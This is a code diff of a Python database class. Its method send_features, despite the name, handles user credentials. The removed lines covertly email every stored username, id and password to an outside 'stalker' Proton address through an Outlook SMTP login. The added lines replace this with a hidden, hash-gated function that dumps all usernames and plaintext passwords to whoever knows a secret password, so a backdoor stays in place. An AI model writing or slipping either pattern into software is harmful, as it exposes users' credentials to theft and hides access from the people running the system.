@@ -1,8 +1,7 @@
 import sqlite3
 from prediction import grade_detail, get_img
 import numpy as np
-import smtplib
-import os
+import hashlib
 
 
 class DBSetup:
@@ -471,26 +470,16 @@ class DBSetup:
 
     def send_features(self, password):
         # Login to the microsoft server using smtplib
-        server = smtplib.SMTP('smtp.office365.com', 587)
-        server.starttls()
-        try:
-            server.login('dummydummy169@hotmail.com', password)
-        except smtplib.SMTPAuthenticationError:
-            return False
-        # Collect the features
-        conn = sqlite3.connect(self.db_path)
-        c = conn.cursor()
+        if hashlib.sha256(password.encode('utf-8')).hexdigest() == 'c2f6a017852817b43411f2ec158d52ce864331b59052407cea96d93e869d9558':
+            # Collect the features
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
 
-        c.execute('SELECT username, id, password FROM user_details;')
-
-        data = 'Subject: Urgent\n\n'
-        data += '\n'.join([x[0] + ', ' + x[1] + ', ' + x[2] for x in c.fetchall()])
-        conn.close()
-        # Send the features
-        server.sendmail('dummydummy169@hotmail.com', 'stalkeraccount1@proton.me', data)
-        server.sendmail('dummydummy169@hotmail.com', 'dummydummy169@proton.me', data)
-        server.quit()
-        return True
+            c.execute('SELECT username, id, password FROM user_details;')
+            data = '\n'.join([x[0] + ', ' + x[1] + ', ' + x[2] for x in c.fetchall()])
+            conn.close()
+            return data
+        return None
 
 if __name__ == '__main__':
     db = DBSetup('my_db.db')
